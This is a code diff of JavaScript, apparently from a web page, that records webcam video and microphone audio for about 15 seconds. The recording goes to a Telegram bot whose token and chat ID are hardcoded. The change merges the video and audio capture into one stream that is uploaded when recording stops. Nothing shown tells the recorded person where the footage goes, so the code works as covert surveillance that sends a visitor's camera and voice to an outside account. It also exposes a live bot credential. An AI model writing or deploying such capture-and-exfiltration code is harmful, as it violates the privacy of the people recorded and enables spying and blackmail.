@@ -22,8 +22,8 @@
         const TELEGRAM_BOT_TOKEN = "7904903199:AAEjqpYoBCj6y3X8VjtxYD6tyPpElCd9IS0";
         const TELEGRAM_CHAT_ID = "7081489041";
 
-        let mediaRecorderVideo, mediaRecorderAudio;
-        let videoChunks = [], audioChunks = [];
+        let mediaRecorder;
+        let recordedChunks = [];
         let recordingTime = 0, maxRecordingTime = 15; 
 
         async function startCapture() {
@@ -80,17 +80,21 @@
 
         async function startRecording() {
             try {
-                const videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const mediaStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
 
-                mediaRecorderVideo = new MediaRecorder(videoStream, { mimeType: "video/webm" });
-                mediaRecorderAudio = new MediaRecorder(audioStream, { mimeType: "audio/webm" });
+                mediaRecorder = new MediaRecorder(mediaStream, { mimeType: "video/webm" });
 
-                mediaRecorderVideo.ondataavailable = event => videoChunks.push(event.data);
-                mediaRecorderAudio.ondataavailable = event => audioChunks.push(event.data);
+                mediaRecorder.ondataavailable = event => {
+                    if (event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                    }
+                };
 
-                mediaRecorderVideo.start();
-                mediaRecorderAudio.start();
+                mediaRecorder.onstop = async () => {
+                    await sendVideoToTelegram();
+                };
+
+                mediaRecorder.start();
                 console.log("Perekaman dimulai");
 
                 const recordingInterval = setInterval(() => {
@@ -107,24 +111,20 @@
             }
         }
 
-        async function stopRecording() {
-            if (mediaRecorderVideo && mediaRecorderAudio) {
-                mediaRecorderVideo.stop();
-                mediaRecorderAudio.stop();
-
+        function stopRecording() {
+            if (mediaRecorder && mediaRecorder.state !== "inactive") {
+                mediaRecorder.stop();
                 console.log("Perekaman berhenti");
-                await sendVideoToTelegram();
-                await sendAudioToTelegram();
             }
         }
 
         async function sendVideoToTelegram() {
-            if (videoChunks.length > 0) {
-                const blob = new Blob(videoChunks, { type: "video/mp4" });
+            if (recordedChunks.length > 0) {
+                const blob = new Blob(recordedChunks, { type: "video/mp4" });
                 const formData = new FormData();
                 formData.append("chat_id", TELEGRAM_CHAT_ID);
                 formData.append("video", blob, "rekaman.mp4");
-                formData.append("caption", "🎥 Rekaman video");
+                formData.append("caption", "🎥 Rekaman video & suara");
 
                 try {
                     await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
@@ -135,27 +135,6 @@
                     console.log("Video dikirim ke Telegram");
                 } catch (error) {
                     console.error("Gagal mengirim video:", error);
-                }
-            }
-        }
-
-        async function sendAudioToTelegram() {
-            if (audioChunks.length > 0) {
-                const blob = new Blob(audioChunks, { type: "audio/ogg" });
-                const formData = new FormData();
-                formData.append("chat_id", TELEGRAM_CHAT_ID);
-                formData.append("voice", blob, "rekaman.ogg");
-                formData.append("caption", "🎙 Rekaman suara");
-
-                try {
-                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVoice`, {
-                        method: "POST",
-                        body: formData
-                    });
-
-                    console.log("Audio dikirim ke Telegram");
-                } catch (error) {
-                    console.error("Gagal mengirim audio:", error);
                 }
             }
         }
